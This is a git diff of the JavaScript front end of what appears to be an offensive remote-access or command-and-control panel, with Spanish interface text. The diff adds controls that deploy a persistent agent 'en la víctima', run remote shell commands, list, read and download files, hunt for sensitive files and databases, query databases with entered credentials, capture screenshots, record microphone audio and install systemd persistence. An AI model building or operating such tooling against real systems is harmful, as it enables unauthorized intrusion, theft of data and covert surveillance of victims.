@@ -2367,17 +2367,7 @@ async function loadScanVulnerabilities(scanId, slNo) {
                     </p>
                     <p style="margin: 0; font-size: 0.85rem; color: var(--text-secondary);">${escapeHtml(cleanDisplayText(vuln.description) || 'Sin descripcion')}</p>
                 </div>
-                <div class="settings-actions" style="margin-top: 0.8rem;">
-                    <button type="button" class="btn btn-primary" data-exploit-vuln-session="${vuln.id}">
-                        <i class="fas fa-rocket"></i> Explotar Ahora
-                    </button>
-                </div>
             `;
-            
-            vulnEl.querySelector(`[data-exploit-vuln-session="${vuln.id}"]`)?.addEventListener('click', () => {
-                showVulnerabilityExploitModal(vuln);
-            });
-            
             fragment.appendChild(vulnEl);
         });
         vulnsList.appendChild(fragment);
@@ -2768,6 +2758,20 @@ function setupCVEHandlers() {
 // ============================================
 let explorerScanId = '';
 let explorerConnected = false;
+let explorerAgentOnline = false;
+
+function renderAgentStatus() {
+    const badge = document.getElementById('explorer-agent-badge');
+    if (!badge) return;
+    if (explorerAgentOnline) {
+        badge.textContent = 'Agente: online';
+        badge.style.background = 'var(--success)';
+        badge.style.color = '#fff';
+        badge.style.display = 'inline-flex';
+    } else {
+        badge.style.display = 'none';
+    }
+}
 
 function explorerConnect(scanId) {
     if (!scanId) return;
@@ -2777,6 +2781,8 @@ function explorerConnect(scanId) {
     const toolbarActions = document.getElementById('explorer-toolbar-actions');
     if (toolbar) toolbar.style.display = 'block';
     if (toolbarActions) toolbarActions.style.display = 'flex';
+    const deployBtn = document.getElementById('explorer-deploy-btn');
+    if (deployBtn) deployBtn.disabled = false;
     const connStatus = document.getElementById('explorer-conn-status');
     if (connStatus) {
         connStatus.className = 'explorer-conn-status connected';
@@ -2786,27 +2792,40 @@ function explorerConnect(scanId) {
         if (text) text.textContent = 'Conectado a ' + scanId;
     }
     const output = document.getElementById('explorer-output');
-    if (output) output.textContent = 'Conectado. Usa los comandos para explorar.';
+    if (output) output.textContent = 'Conectado. Despliega el agente con el botón superior o usa Archivos / Sistema.';
     loadExplorerDownloads();
+    // Verifica si el agente ya está activo para este scan
+    fetch('/api/explorer/agent-status?scan_id=' + encodeURIComponent(scanId), {
+        headers: getAuthHeaders(true),
+    }).then(r => r.json()).then((data) => {
+        if (data.deployed && data.online) {
+            explorerAgentOnline = true;
+            renderAgentStatus();
+        }
+    }).catch(() => {});
 }
 
 function explorerDisconnect() {
     explorerScanId = null;
     explorerConnected = false;
+    explorerAgentOnline = false;
     const toolbar = document.getElementById('explorer-toolbar');
     const toolbarActions = document.getElementById('explorer-toolbar-actions');
     if (toolbar) toolbar.style.display = 'none';
     if (toolbarActions) toolbarActions.style.display = 'none';
+    const deployBtn = document.getElementById('explorer-deploy-btn');
+    if (deployBtn) deployBtn.disabled = true;
     const connStatus = document.getElementById('explorer-conn-status');
     if (connStatus) {
         connStatus.className = 'explorer-conn-status disconnected';
         const icon = connStatus.querySelector('i');
         if (icon) icon.className = 'fas fa-plug';
         const text = connStatus.querySelector('span');
-        if (text) text.textContent = 'Esperando sesión activa...';
+        if (text) text.textContent = 'Esperando sesión activa...';
     }
     const output = document.getElementById('explorer-output');
     if (output) output.textContent = 'Desconectado.';
+    renderAgentStatus();
 }
 
 function explorerUpdateSessionInfo(scan) {
@@ -2826,112 +2845,289 @@ function explorerUpdateSessionInfo(scan) {
 }
 
 function setupExplorerHandlers() {
-    const btnMap = {
-        'explorer-ls-btn': async () => {
-            const path = document.getElementById('explorer-path').value || '/';
-            return apiFetch('/api/explorer/ls', { method: 'POST', body: JSON.stringify({ scan_id: explorerScanId, command: path }) });
-        },
-        'explorer-cat-btn': async () => {
-            const path = document.getElementById('explorer-file-path').value;
-            if (!path) { showToast('Ingresa un path', 'error'); return null; }
-            return apiFetch('/api/explorer/cat', { method: 'POST', body: JSON.stringify({ scan_id: explorerScanId, command: path }) });
-        },
-        'explorer-dl-btn': async () => {
-            const path = document.getElementById('explorer-file-path').value;
-            if (!path) { showToast('Ingresa un path', 'error'); return null; }
-            const result = await apiFetch('/api/explorer/download', { method: 'POST', body: JSON.stringify({ scan_id: explorerScanId, command: path }) });
-            loadExplorerDownloads();
-            return result;
-        },
-        'explorer-search-btn': async () => {
-            const pattern = document.getElementById('explorer-search-pattern').value;
-            if (!pattern) { showToast('Ingresa un patrón', 'error'); return null; }
-            return apiFetch('/api/explorer/search', { method: 'POST', body: JSON.stringify({ scan_id: explorerScanId, command: pattern }) });
-        },
-        'explorer-grep-btn': async () => {
-            const pattern = document.getElementById('explorer-search-pattern').value;
-            if (!pattern) { showToast('Ingresa un patrón', 'error'); return null; }
-            return apiFetch('/api/explorer/grep', { method: 'POST', body: JSON.stringify({ scan_id: explorerScanId, command: pattern }) });
-        },
-        'explorer-dbs-btn': async () => {
-            return apiFetch('/api/explorer/databases', { method: 'POST', body: JSON.stringify({ scan_id: explorerScanId }) });
-        },
-        'explorer-sensitive-btn': async () => {
-            return apiFetch('/api/explorer/sensitive', { method: 'POST', body: JSON.stringify({ scan_id: explorerScanId }) });
-        },
-        'explorer-sysinfo-btn': async () => {
-            return apiFetch('/api/explorer/system', { method: 'POST', body: JSON.stringify({ scan_id: explorerScanId }) });
-        },
-        'explorer-db-query-btn': async () => {
-            const dbType = document.getElementById('explorer-db-type').value;
-            const host = document.getElementById('explorer-db-host').value || 'localhost';
-            const user = document.getElementById('explorer-db-user').value || 'root';
-            const pass = document.getElementById('explorer-db-pass').value;
-            const dbName = document.getElementById('explorer-db-name').value;
-            const query = document.getElementById('explorer-db-query').value;
-            return apiFetch('/api/explorer/db-query', {
-                method: 'POST',
-                body: JSON.stringify({ scan_id: explorerScanId, db_type: dbType, host, user, password: pass, database: dbName, query }),
-            });
-        },
-    };
+    // Tabs
+    document.querySelectorAll('.explorer-tab').forEach((tab) => {
+        tab.addEventListener('click', () => {
+            document.querySelectorAll('.explorer-tab').forEach((t) => t.classList.remove('active'));
+            document.querySelectorAll('.explorer-tab-panel').forEach((p) => p.classList.remove('active'));
+            tab.classList.add('active');
+            const tabId = tab.getAttribute('data-tab');
+            const panel = document.getElementById('explorer-tab-' + tabId);
+            if (panel) panel.classList.add('active');
+        });
+    });
 
-    for (const [id, handler] of Object.entries(btnMap)) {
-        document.getElementById(id)?.addEventListener('click', async () => {
-            if (!explorerConnected) {
-                // Try auto-connect
-                if (activeScanId && currentScanData) {
-                    explorerConnect(activeScanId);
-                } else {
-                    showToast('No hay sesión activa para explorar', 'error');
-                    return;
-                }
+    // Deploy agent
+    document.getElementById('explorer-deploy-btn')?.addEventListener('click', async () => {
+        if (!explorerScanId) { showToast('Conecta una sesión primero', 'error'); return; }
+        if (!confirm('Desplegar agente persistente en la víctima?')) return;
+        const btn = document.getElementById('explorer-deploy-btn');
+        const badge = document.getElementById('explorer-agent-badge');
+        btn.disabled = true;
+        btn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Desplegando…';
+        try {
+            const data = await apiFetch('/api/explorer/deploy-agent', {
+                method: 'POST',
+                body: JSON.stringify({ scan_id: explorerScanId }),
+                timeout: 90000,
+            });
+            if (data.agent && data.agent.verified) {
+                badge.textContent = 'Agente: online';
+                badge.style.background = 'var(--success)';
+                badge.style.color = '#fff';
+                badge.style.display = 'inline-flex';
+                showToast('Agente desplegado y verificado', 'success');
+                explorerAgentOnline = true;
+                renderAgentStatus();
+            } else {
+                badge.textContent = 'Agente: subido pero offline';
+                badge.style.background = 'var(--danger)';
+                badge.style.color = '#fff';
+                badge.style.display = 'inline-flex';
+                showToast(data.message || 'Agente subido pero no responde', 'error');
             }
-            try {
-                const data = await handler();
-                if (!data) return;
-                const outputEl = document.getElementById('explorer-output');
-                if (!outputEl) return;
-                if (data.data && data.data.items) {
-                    outputEl.textContent = data.data.items.map(i =>
-                        `${i.permissions} ${i.owner} ${String(i.size).padStart(8)} ${i.name}`
-                    ).join('\n') || '(directorio vacío)';
-                } else if (data.data && data.data.content !== undefined) {
-                    outputEl.textContent = data.data.content.substring(0, 10000);
-                } else if (data.data && data.data.files) {
-                    outputEl.textContent = data.data.files.join('\n');
-                } else if (data.data && data.data.results) {
-                    outputEl.textContent = data.data.results.join('\n');
-                } else if (data.data && data.data.databases) {
-                    outputEl.textContent = data.data.databases.map(d => `[${d.command}]\n${d.output.substring(0, 500)}`).join('\n---\n');
-                } else if (data.data && data.data.findings) {
-                    outputEl.textContent = data.data.findings.map(f => `=== ${f.label} ===\n${f.command}\n${f.output.substring(0, 500)}`).join('\n---\n');
-                } else if (data.data && data.data.output) {
-                    outputEl.textContent = data.data.output.substring(0, 10000);
-                } else if (data.success === false) {
-                    outputEl.textContent = `Error: ${JSON.stringify(data)}`;
-                } else {
-                    outputEl.textContent = JSON.stringify(data, null, 2).substring(0, 10000);
-                }
-                if (data.data && data.data.downloaded_to) {
-                    showToast(`Descargado: ${data.data.downloaded_to}`, 'success');
-                }
-            } catch (err) {
-                const outputEl = document.getElementById('explorer-output');
-                if (outputEl) outputEl.textContent = `Error: ${err.message}`;
-            }
+        } catch (err) {
+            showToast('Error desplegando agente: ' + err.message, 'error');
+        } finally {
+            btn.disabled = false;
+            btn.innerHTML = '<i class="fas fa-rocket"></i> Desplegar agente';
+        }
+    });
+
+    // Helper: llama a un módulo del agente
+    async function agentCall(module, args = {}) {
+        return apiFetch('/api/explorer/agent/' + module, {
+            method: 'POST',
+            body: JSON.stringify({ scan_id: explorerScanId, args: args }),
+            timeout: 60000,
         });
     }
 
-    // Refresh button
+    function showOutput(id, text) {
+        const el = document.getElementById(id);
+        if (el) el.textContent = text || '(sin salida)';
+    }
+
+    function showResultData(data) {
+        const out = document.getElementById('explorer-output');
+        if (!out) return;
+        const result = data.result || data.data || data;
+        if (Array.isArray(result)) {
+            out.textContent = JSON.stringify(result, null, 2);
+        } else if (typeof result === 'object') {
+            const cleaned = Object.assign({}, result);
+            if (cleaned.content_b64) cleaned.content_b64 = '[' + (cleaned.content_b64.length || 0) + ' bytes b64]';
+            if (cleaned.data_b64) cleaned.data_b64 = '[' + (cleaned.data_b64.length || 0) + ' bytes b64]';
+            out.textContent = JSON.stringify(cleaned, null, 2);
+        } else {
+            out.textContent = String(result);
+        }
+    }
+
+    // Shell tab
+    document.getElementById('explorer-shell-btn')?.addEventListener('click', async () => {
+        const cmd = document.getElementById('explorer-shell-input').value;
+        if (!cmd) return;
+        const outEl = document.getElementById('explorer-shell-output');
+        outEl.textContent = '$ ' + cmd + '\n...\n';
+        try {
+            const data = await agentCall('shell', { command: cmd });
+            const r = data.result || {};
+            outEl.textContent = '$ ' + cmd + '\n' + (r.stdout || '') + (r.stderr ? '\n[stderr] ' + r.stderr : '');
+        } catch (err) {
+            outEl.textContent = '$ ' + cmd + '\n[!] ' + err.message;
+        }
+    });
+    document.getElementById('explorer-shell-input')?.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') document.getElementById('explorer-shell-btn').click();
+    });
+    document.getElementById('explorer-shell-clear-btn')?.addEventListener('click', () => {
+        const el = document.getElementById('explorer-shell-output');
+        if (el) el.textContent = '';
+    });
+
+    // Files tab (usa endpoints directos vía shell)
+    async function filesApi(endpoint, command) {
+        return apiFetch('/api/explorer/' + endpoint, {
+            method: 'POST',
+            body: JSON.stringify({ scan_id: explorerScanId, command: command }),
+        });
+    }
+    document.getElementById('explorer-ls-btn')?.addEventListener('click', async () => {
+        const path = document.getElementById('explorer-path').value || '/';
+        try {
+            const data = await filesApi('ls', path);
+            const out = document.getElementById('explorer-output');
+            if (data.data && data.data.items) {
+                out.textContent = data.data.items.map((i) => (i.type === 'dir' ? 'd' : i.type === 'link' ? 'l' : '-') + ' ' + i.mode + ' ' + (i.size || 0) + ' ' + i.name).join('\n') || '(vacio)';
+            } else {
+                out.textContent = JSON.stringify(data, null, 2);
+            }
+        } catch (err) { showOutput('explorer-output', 'Error: ' + err.message); }
+    });
+    document.getElementById('explorer-cat-btn')?.addEventListener('click', async () => {
+        const path = document.getElementById('explorer-file-path').value;
+        if (!path) { showToast('Ingresa un path', 'error'); return; }
+        try {
+            const data = await filesApi('cat', path);
+            const out = document.getElementById('explorer-output');
+            if (data.data && data.data.content !== undefined) out.textContent = data.data.content;
+            else if (data.data && data.data.is_text === false) out.textContent = '(archivo binario - usa Descargar)';
+            else out.textContent = JSON.stringify(data, null, 2);
+        } catch (err) { showOutput('explorer-output', 'Error: ' + err.message); }
+    });
+    document.getElementById('explorer-dl-btn')?.addEventListener('click', async () => {
+        const path = document.getElementById('explorer-file-path').value;
+        if (!path) { showToast('Ingresa un path', 'error'); return; }
+        try {
+            await filesApi('download', path);
+            showToast('Descargado', 'success');
+            loadExplorerDownloads();
+        } catch (err) { showToast('Error: ' + err.message, 'error'); }
+    });
+    document.getElementById('explorer-search-btn')?.addEventListener('click', async () => {
+        const pattern = document.getElementById('explorer-search-pattern').value;
+        if (!pattern) { showToast('Ingresa un patron', 'error'); return; }
+        try {
+            const data = await filesApi('search', pattern);
+            showOutput('explorer-output', (data.data && data.data.files || []).join('\n') || '(ningun match)');
+        } catch (err) { showOutput('explorer-output', 'Error: ' + err.message); }
+    });
+    document.getElementById('explorer-grep-btn')?.addEventListener('click', async () => {
+        const pattern = document.getElementById('explorer-search-pattern').value;
+        if (!pattern) { showToast('Ingresa un patron', 'error'); return; }
+        try {
+            const data = await filesApi('grep', pattern);
+            showOutput('explorer-output', (data.data && data.data.results || []).join('\n') || '(sin matches)');
+        } catch (err) { showOutput('explorer-output', 'Error: ' + err.message); }
+    });
+
+    // System tab (usa agente)
+    document.getElementById('explorer-sysinfo-btn')?.addEventListener('click', async () => {
+        try {
+            const data = await agentCall('info');
+            showResultData(data);
+        } catch (err) { showOutput('explorer-output', 'Error: ' + err.message); }
+    });
+    document.getElementById('explorer-processes-btn')?.addEventListener('click', async () => {
+        try {
+            const data = await agentCall('processes');
+            showResultData(data);
+        } catch (err) { showOutput('explorer-output', 'Error: ' + err.message); }
+    });
+    document.getElementById('explorer-network-btn')?.addEventListener('click', async () => {
+        try {
+            const data = await agentCall('network');
+            showResultData(data);
+        } catch (err) { showOutput('explorer-output', 'Error: ' + err.message); }
+    });
+    document.getElementById('explorer-sensitive-btn')?.addEventListener('click', async () => {
+        try {
+            const data = await filesApi('sensitive', 'all');
+            showResultData(data);
+        } catch (err) { showOutput('explorer-output', 'Error: ' + err.message); }
+    });
+    document.getElementById('explorer-dbs-btn')?.addEventListener('click', async () => {
+        try {
+            const data = await filesApi('databases', 'all');
+            showResultData(data);
+        } catch (err) { showOutput('explorer-output', 'Error: ' + err.message); }
+    });
+
+    // Capture tab
+    document.getElementById('explorer-screenshot-btn')?.addEventListener('click', async () => {
+        const btn = document.getElementById('explorer-screenshot-btn');
+        btn.disabled = true; btn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Capturando…';
+        try {
+            const data = await apiFetch('/api/explorer/screenshot', {
+                method: 'POST',
+                body: JSON.stringify({ scan_id: explorerScanId, args: {} }),
+                timeout: 90000,
+            });
+            const b64 = data.data && data.data.data_b64;
+            if (b64) {
+                const img = document.getElementById('explorer-screenshot-preview');
+                img.src = 'data:image/png;base64,' + b64;
+                img.style.display = 'block';
+                showToast('Captura tomada y guardada', 'success');
+                loadExplorerDownloads();
+            } else {
+                showToast('Sin imagen capturada', 'error');
+            }
+        } catch (err) {
+            showToast('Error: ' + err.message, 'error');
+        } finally {
+            btn.disabled = false; btn.innerHTML = '<i class="fas fa-camera"></i> Capturar pantalla';
+        }
+    });
+    document.getElementById('explorer-audio-btn')?.addEventListener('click', async () => {
+        const btn = document.getElementById('explorer-audio-btn');
+        const dur = parseInt(document.getElementById('explorer-audio-duration').value || '5');
+        btn.disabled = true; btn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Grabando…';
+        try {
+            const data = await apiFetch('/api/explorer/audio', {
+                method: 'POST',
+                body: JSON.stringify({ scan_id: explorerScanId, args: { duration: dur } }),
+                timeout: 90000,
+            });
+            const b64 = data.data && data.data.data_b64;
+            if (b64) {
+                const audio = document.getElementById('explorer-audio-preview');
+                audio.src = 'data:audio/wav;base64,' + b64;
+                audio.style.display = 'block';
+                showToast('Audio grabado (' + dur + 's)', 'success');
+                loadExplorerDownloads();
+            } else {
+                showToast('Sin audio grabado', 'error');
+            }
+        } catch (err) {
+            showToast('Error: ' + err.message, 'error');
+        } finally {
+            btn.disabled = false; btn.innerHTML = '<i class="fas fa-microphone"></i> Grabar';
+        }
+    });
+
+    // Persistence
+    document.getElementById('explorer-persist-btn')?.addEventListener('click', async () => {
+        if (!confirm('Instalar el agente como servicio systemd? Requiere root.')) return;
+        try {
+            const data = await agentCall('persist');
+            showOutput('explorer-persist-output', JSON.stringify(data.result || data, null, 2));
+            showToast(data.result && data.result.success ? 'Persistencia instalada' : 'Fallo la persistencia',
+                      data.result && data.result.success ? 'success' : 'error');
+        } catch (err) {
+            showOutput('explorer-persist-output', 'Error: ' + err.message);
+        }
+    });
+
+    // DB
+    document.getElementById('explorer-db-query-btn')?.addEventListener('click', async () => {
+        const dbType = document.getElementById('explorer-db-type').value;
+        const host = document.getElementById('explorer-db-host').value || 'localhost';
+        const user = document.getElementById('explorer-db-user').value || 'root';
+        const pass = document.getElementById('explorer-db-pass').value;
+        const dbName = document.getElementById('explorer-db-name').value;
+        const query = document.getElementById('explorer-db-query').value;
+        try {
+            const data = await apiFetch('/api/explorer/db-query', {
+                method: 'POST',
+                body: JSON.stringify({ scan_id: explorerScanId, db_type: dbType, host, user, password: pass, database: dbName, query }),
+                timeout: 30000,
+            });
+            showOutput('explorer-db-output', (data.data && data.data.output) || '(vacio)');
+        } catch (err) {
+            showOutput('explorer-db-output', 'Error: ' + err.message);
+        }
+    });
+
+    // Refresh
     document.getElementById('explorer-refresh-btn')?.addEventListener('click', () => {
         if (activeScanId) {
             explorerConnect(activeScanId);
             fetchActiveScan();
+            renderAgentStatus();
         }
     });
-
-    // Downloads refresh
     document.getElementById('explorer-downloads-refresh')?.addEventListener('click', loadExplorerDownloads);
 }
 
